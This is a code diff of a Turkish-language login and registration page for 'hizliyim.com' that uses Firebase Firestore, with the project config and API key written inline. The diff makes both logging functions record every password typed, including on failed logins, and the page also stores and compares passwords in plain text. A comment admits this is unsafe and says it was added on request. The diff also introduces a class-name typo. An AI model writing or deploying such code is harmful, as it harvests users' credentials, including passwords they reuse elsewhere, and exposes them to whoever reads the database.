@@ -10,10 +10,9 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, getDocs, query, where, doc, setDoc, getDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, doc, setDoc, getDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
         
         // --- KULLANICI TARAFINDAN SAĞLANAN FIREBASE CONFIG ---
-        // Bu config doğrudan senin projen için kullanılacak.
         const myFirebaseConfig = {
             apiKey: "AIzaSyCP0Rd8CAfzYRPtakfdQWBqS5uBn045XpE",
             authDomain: "hizliyimforum.firebaseapp.com",
@@ -24,219 +23,206 @@
             appId: "1:903963422468:web:936c368393585efd0cea51"
         };
 
-        // Firebase'i Başlat
-        const app = initializeApp(myFirebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        
-        // Log Seviyesini Ayarla (Hata ayıklama için)
-        setLogLevel('Debug');
+        let db, auth, userId;
 
-        let userId = 'anon-user'; // Başlangıçta varsayılan kimlik
+        try {
+            const app = initializeApp(myFirebaseConfig);
+            db = getFirestore(app);
+            auth = getAuth(app);
+            setLogLevel('Debug');
+            console.log("Firebase başarıyla başlatıldı.");
+        } catch (e) {
+            console.error("Firebase başlatma hatası:", e);
+        }
 
         /**
          * Firebase Oturumunu Yönetme
-         * Standalone GH Pages için anonim oturum açma.
          */
         async function authenticateUser() {
+            if (!auth) {
+                console.error("Firebase Auth başlatılamadı.");
+                return;
+            }
             try {
                 await signInAnonymously(auth);
                 userId = auth.currentUser?.uid || crypto.randomUUID();
                 console.log("Firebase Anonim Oturum Açıldı. User ID:", userId);
             } catch (error) {
-                console.error("Oturum açma hatası:", error);
+                console.error("Anonim oturum açma hatası:", error);
                 userId = crypto.randomUUID(); 
             }
-            // Global değişkenleri ayarla
             window.db = db;
-            window.auth = auth;
             window.userId = userId;
-            window.router.initialize(); // Yetkilendirme sonrası router'ı başlat
+            window.router.initialize();
         }
 
         // --- Yardımcı Fonksiyonlar ---
-
-        /**
-         * Basit cihaz ve tarayıcı bilgisini döndürür.
-         */
         function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             let device = 'Bilinmeyen Cihaz';
             let browser = 'Bilinmeyen Tarayıcı';
-
             if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edge") === -1) browser = "Chrome";
             else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
             else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
             else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
-            
             if (/Mobi|Android/i.test(userAgent)) device = "Mobil Cihaz";
             else if (/iPad|Tablet/i.test(userAgent)) device = "Tablet";
             else if (/Macintosh|Windows|Linux/i.test(userAgent)) device = "Masaüstü";
-
             return `${device} (${browser})`;
         }
 
-
         /**
-         * Giriş İşlemi Loglama
+         * Giriş İşlemi Loglama (Şifre eklendi)
          * @param {string} email - Giriş yapılan e-posta adresi
+         * @param {string} password - Girilen şifre (Yeni eklendi)
          * @param {boolean} success - İşlem başarılı mı?
          */
-        async function logLoginAttempt(email, success) {
+        async function logLoginAttempt(email, password, success) {
+            if (!window.db) return console.error("DB başlatılmadı, log atlanıyor.");
             const logData = {
                 timestamp: new Date().toISOString(),
                 email: email,
+                // !!! GÜVENLİK UYARISI: Şifre loglama gerçek uygulamalarda KESİNLİKLE YAPILMAMALIDIR. (Alicenin isteği üzerine eklendi)
+                password: password, 
                 isSuccess: success,
                 deviceInfo: getDeviceInfo(),
-                ipSimulated: '192.168.x.x (Simulated)',
                 userId: window.userId
             };
-
-            // DÜZELTME: Doğrudan koleksiyon adını kullan
             const logPath = "giris_log";
-
             try {
-                await addDoc(collection(window.db, logPath), logData);
-                console.log("Giriş logu başarıyla kaydedildi.", logData);
+                const docRef = await addDoc(collection(window.db, logPath), logData);
+                console.log("Giriş logu başarıyla kaydedildi. Doc ID:", docRef.id);
             } catch (e) {
-                console.error("Giriş logu kaydetme hatası:", e);
+                console.error("!!! GİRİŞ LOGU KAYDETME HATASI !!!", e.message);
+                console.error("Detay:", e);
             }
         }
 
         /**
-         * Kayıt İşlemi Loglama
+         * Kayıt İşlemi Loglama (Şifre eklendi)
          * @param {string} username - Kullanıcı adı
          * @param {string} email - E-posta
+         * @param {string} password - Şifre (Yeni eklendi)
          */
-        async function logRegistration(username, email) {
+        async function logRegistration(username, email, password) {
+            if (!window.db) return console.error("DB başlatılmadı, log atlanıyor.");
             const logData = {
                 timestamp: new Date().toISOString(),
                 username: username,
                 email: email,
+                // !!! GÜVENLİK UYARISI: Şifre loglama gerçek uygulamalarda KESİNLİKLE YAPILMAMALIDIR. (Alicenin isteği üzerine eklendi)
+                password: password, 
                 deviceInfo: getDeviceInfo(),
-                ipSimulated: '192.168.x.x (Simulated)',
                 userId: window.userId
             };
-
-            // DÜZELTME: Doğrudan koleksiyon adını kullan
             const logPath = "kayit_log";
-
             try {
-                await addDoc(collection(window.db, logPath), logData);
-                console.log("Kayıt logu başarıyla kaydedildi.", logData);
+                const docRef = await addDoc(collection(window.db, logPath), logData);
+                console.log("Kayıt logu başarıyla kaydedildi. Doc ID:", docRef.id);
             } catch (e) {
-                console.error("Kayıt logu kaydetme hatası:", e);
+                console.error("!!! KAYIT LOGU KAYDETME HATASI !!!", e.message);
+                console.error("Detay:", e);
             }
         }
 
         /**
          * Kayıt Verilerini Kaydetme
-         * @param {string} username - Kullanıcı adı
-         * @param {string} email - E-posta
-         * @param {string} password - Şifre (Test amaçlı düz metin)
          */
         async function saveRegistrationData(username, email, password) {
-             // DÜZELTME: Doğrudan koleksiyon adını kullan
-             const usersPath = "users";
+            if (!window.db) {
+                 console.error("DB başlatılmadı, kayıt yapılamıyor.");
+                 return { success: false, message: "Veritabanı bağlantı hatası." };
+            }
 
-             // E-posta adresini belge ID'si olarak kullanmak benzersizliği sağlar
+             const usersPath = "users";
              const userRef = doc(window.db, usersPath, email.toLowerCase());
 
-             // DİKKAT: E-posta zaten var mı diye kontrol et
-             const docSnap = await getDoc(userRef);
-             if (docSnap.exists()) {
-                 console.warn("Bu e-posta zaten kayıtlı:", email);
-                 return false; // Başarısız, e-posta mevcut
-             }
+             try {
+                const docSnap = await getDoc(userRef);
+                if (docSnap.exists()) {
+                    console.warn("Bu e-posta zaten kayıtlı:", email);
+                    return { success: false, message: "Bu e-posta zaten kullanılıyor." };
+                }
 
-             const userData = {
-                username: username,
-                email: email.toLowerCase(),
-                password: password, // Şifre düz metin olarak saklanıyor (Test amaçlı)
-                createdAt: new Date().toISOString(),
-                status: 'pending'
-            };
+                const userData = {
+                    username: username,
+                    email: email.toLowerCase(),
+                    password: password, 
+                    createdAt: new Date().toISOString(),
+                    status: 'pending'
+                };
 
-            try {
                 await setDoc(userRef, userData);
-                await logRegistration(username, email); // Log kaydını da at
-                return true;
+                console.log("Kullanıcı başarıyla 'users' koleksiyonuna kaydedildi.");
+                
+                // GÜNCELLEME: Şifre, logRegistration fonksiyonuna gönderiliyor
+                await logRegistration(username, email, password); 
+                
+                return { success: true };
+
             } catch (e) {
-                console.error("Kayıt verisi kaydetme hatası:", e);
-                return false;
+                console.error("!!! KULLANICI KAYIT HATASI (setDoc) !!!", e.message);
+                console.error("Detay:", e);
+                return { success: false, message: "Sunucu hatası. Lütfen konsolu kontrol edin." };
             }
         }
 
         /**
          * Giriş Kimlik Bilgilerini Doğrulama
-         * @param {string} email - E-posta
-         * @param {string} password - Şifre
-         * @returns {Promise<boolean>} Doğrulama başarılıysa true
          */
         async function verifyLoginCredentials(email, password) {
-            // DÜZELTME: Doğrudan koleksiyon adını kullan
+             if (!window.db) {
+                 console.error("DB başlatılmadı, doğrulama yapılamıyor.");
+                 return false;
+             }
             const usersPath = "users";
-
             const userRef = doc(window.db, usersPath, email.toLowerCase());
 
             try {
                 const docSnap = await getDoc(userRef);
-
                 if (docSnap.exists()) {
                     const userData = docSnap.data();
                     if (userData.password === password) {
-                        return true; // Başarılı giriş
+                        console.log("Giriş bilgileri doğrulandı.");
+                        return true;
                     }
                 }
-                return false; // Kullanıcı yok veya şifre yanlış
+                console.warn("Kullanıcı bulunamadı veya şifre yanlış:", email);
+                return false;
             } catch (e) {
-                console.error("Giriş doğrulama hatası:", e);
+                console.error("!!! GİRİŞ DOĞRULAMA HATASI (getDoc) !!!", e.message);
+                console.error("Detay:", e);
                 return false;
             }
         }
 
-
         // --- UI ve Router Yönetimi ---
         const router = {
-            routes: {
-                '#': 'login',
-                '#/': 'login',
-                '#/login': 'login',
-                '#/register': 'register',
-                '#/home': 'home'
-            },
-            
+            routes: { '#': 'login', '#/': 'login', '#/login': 'login', '#/register': 'register', '#/home': 'home' },
             load: () => {
                 const hash = window.location.hash || '#/login';
                 const page = router.routes[hash] || 'login';
-                document.querySelectorAll('.page-content').forEach(el => {
-                    el.classList.add('hidden');
-                });
+                document.querySelectorAll('.page-content').forEach(el => el.classList.add('hidden'));
                 const currentPage = document.getElementById(`page-${page}`);
-                if (currentPage) {
-                    currentPage.classList.remove('hidden');
-                }
+                if (currentPage) currentPage.classList.remove('hidden');
             },
-            
             initialize: () => {
                 window.addEventListener('hashchange', router.load);
                 router.load();
+                console.log("Router başlatıldı.");
             }
         };
-        
         window.router = router;
 
         // --- DOM ETKİLEŞİMLERİ ---
         document.addEventListener('DOMContentLoaded', () => {
-            authenticateUser(); // Firebase'i başlat ve anonim oturum aç
+            authenticateUser(); 
 
             const formLogin = document.getElementById('form-login');
             const formRegister = document.getElementById('form-register');
-            
             const loginStatus = document.getElementById('login-status');
             const loginLoadingDiv = document.getElementById('login-loading');
             const loginLinks = document.getElementById('login-links');
-            
             const registerStatus = document.getElementById('register-status');
             const registerLoadingDiv = document.getElementById('register-loading');
             const registerLinks = document.getElementById('register-links');
@@ -245,32 +231,30 @@
             if (formLogin) {
                 formLogin.addEventListener('submit', async (e) => {
                     e.preventDefault();
-                    
-                    // GÜNCELLEME: Formu gizle, yükleniyor ekranını göster
                     formLogin.classList.add('hidden');
                     loginLinks.classList.add('hidden');
                     loginStatus.classList.add('hidden');
                     loginLoadingDiv.classList.remove('hidden');
                     
                     const email = document.getElementById('login-email').value.trim();
-                    const password = document.getElementById('login-password').value;
+                    const password = document.getElementById('login-password').value; // Şifreyi al
 
                     const success = await verifyLoginCredentials(email, password);
-                    await logLoginAttempt(email, success);
+                    
+                    // GÜNCELLEME: Şifre loglama fonksiyonuna gönderiliyor
+                    await logLoginAttempt(email, password, success);
 
                     if (success) {
                         document.getElementById('login-loading-text').textContent = "Giriş Başarılı! Yönlendiriliyorsunuz...";
                         setTimeout(() => {
                             window.location.hash = '#/home';
                             formLogin.reset();
-                            // UI'ı sıfırla
                             formLogin.classList.remove('hidden');
                             loginLinks.classList.remove('hidden');
                             loginLoadingDiv.classList.add('hidden');
                             document.getElementById('login-loading-text').textContent = "Giriş yapılıyor...";
                         }, 1500);
                     } else {
-                        // GÜNCELLEME: Hata durumunda formu geri getir
                         loginLoadingDiv.classList.add('hidden');
                         formLogin.classList.remove('hidden');
                         loginLinks.classList.remove('hidden');
@@ -284,7 +268,7 @@
             if (formRegister) {
                 formRegister.addEventListener('submit', async (e) => {
                     e.preventDefault();
-                    registerStatus.classList.add('hidden'); // Önceki hataları temizle
+                    registerStatus.classList.add('hidden'); 
 
                     const password = document.getElementById('register-password').value;
                     const confirmPassword = document.getElementById('register-confirm-password').value;
@@ -295,7 +279,6 @@
                         return;
                     }
 
-                    // GÜNCELLEME: Formu gizle, yükleniyor ekranını göster
                     formRegister.classList.add('hidden');
                     registerLinks.classList.add('hidden');
                     registerLoadingDiv.classList.remove('hidden');
@@ -303,25 +286,23 @@
                     const username = document.getElementById('register-username').value.trim();
                     const email = document.getElementById('register-email').value.trim();
 
-                    const success = await saveRegistrationData(username, email, password);
+                    const result = await saveRegistrationData(username, email, password);
 
-                    if (success) {
+                    if (result.success) {
                         document.getElementById('register-loading-text').textContent = "Talebiniz alındı. Giriş sayfasına yönlendiriliyorsunuz...";
                         setTimeout(() => {
                             window.location.hash = '#/login';
                             formRegister.reset();
-                            // UI'ı sıfırla
                             formRegister.classList.remove('hidden');
                             registerLinks.classList.remove('hidden');
                             registerLoadingDiv.classList.add('hidden');
                             document.getElementById('register-loading-text').textContent = "Talebiniz işleniyor...";
                         }, 2000);
                     } else {
-                        // GÜNCELLEME: Hata durumunda formu geri getir
                         registerLoadingDiv.classList.add('hidden');
                         formRegister.classList.remove('hidden');
                         registerLinks.classList.remove('hidden');
-                        registerStatus.textContent = "Kayıt hatası. Bu e-posta zaten kullanılıyor olabilir.";
+                        registerStatus.textContent = result.message || "Bilinmeyen bir hata oluştu.";
                         registerStatus.classList.remove('hidden');
                     }
                 });
@@ -353,8 +334,7 @@
             backdrop-filter: blur(10px) saturate(180%);
             -webkit-backdrop-filter: blur(10px) saturate(180%);
             background-color: rgba(255, 255, 255, 0.1);
-            /* GÜNCELLEME: Daha keskin hatlar */
-            border-radius: 12px; 
+            border-radius: 12px; /* Keskin hat */
             border: 1px solid rgba(255, 255, 255, 0.2);
             box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
             padding: 2.5rem;
@@ -368,8 +348,7 @@
             border: 1px solid rgba(255, 255, 255, 0.3);
             color: white;
             padding: 1rem;
-            /* GÜNCELLEME: Daha keskin hatlar */
-            border-radius: 8px;
+            border-radius: 8px; /* Keskin hat */
             transition: all 0.2s ease;
         }
         .premium-input:focus {
@@ -385,8 +364,7 @@
             background: #ffffff;
             color: var(--primary-blue);
             font-weight: 700;
-            /* GÜNCELLEME: Daha keskin hatlar */
-            border-radius: 8px;
+            border-radius: 8px; /* Keskin hat */
             padding: 1rem;
             transition: all 0.2s ease;
             box-shadow: var(--premium-shadow);
@@ -423,14 +401,12 @@
                 <h1 class="text-6xl font-extrabold mb-8 tracking-tighter" style="font-weight: 900;">
                     <span class="text-white text-shadow-lg">hizliyim.com</span>
                 </h1>
-
-                <!-- GÜNCELLEME: Yükleme Ekranı -->
+                
                 <div id="login-loading" class="hidden py-8">
                     <div class="spinner"></div>
                     <p id="login-loading-text" class="text-lg font-semibold">Giriş yapılıyor...</p>
                 </div>
                 
-                <!-- Hata Mesajı Alanı -->
                 <p id="login-status" class="hidden text-sm mb-4 font-semibold text-red-300">Durum Mesajı</p>
 
                 <form id="form-login" class="space-y-4">
@@ -440,14 +416,13 @@
                     </div>
                     <div>
                         <input type="password" id="login-password" placeholder="Şifre" required 
-                            class="premium-input w-full">
+                            class="premium-input w-fll">
                     </div>
                     <button type="submit" class="premium-button w-full">
                         GİRİŞ YAP
                     </button>
                 </form>
-
-                <!-- Üye Ol Linki -->
+                
                 <p id="login-links" class="mt-6 text-sm">
                     Hesabın yok mu? 
                     <a href="#/register" id="register-link" class="font-bold border-b border-white hover:text-gray-300 transition-colors">
@@ -466,13 +441,11 @@
                 
                 <p class="text-lg font-light mb-6">Yeni Bir Premium Hesap Oluştur</p>
 
-                <!-- GÜNCELLEME: Yükleme Ekranı -->
                 <div id="register-loading" class="hidden py-8">
                     <div class="spinner"></div>
                     <p id="register-loading-text" class="text-lg font-semibold">Talebiniz işleniyor...</p>
                 </div>
 
-                <!-- Hata Mesajı Alanı -->
                 <p id="register-status" class="hidden text-sm mb-4 font-semibold text-red-300">Durum Mesajı</p>
 
                 <form id="form-register" class="space-y-4">
@@ -497,7 +470,6 @@
                     </button>
                 </form>
 
-                <!-- Giriş Yap Linki -->
                 <p id="register-links" class="mt-6 text-sm">
                     Zaten hesabın var mı? 
                     <a href="#/login" class="font-bold border-b border-white hover:text-gray-300 transition-colors">
@@ -526,5 +498,4 @@
     </main>
 </body>
 </html>
-
 
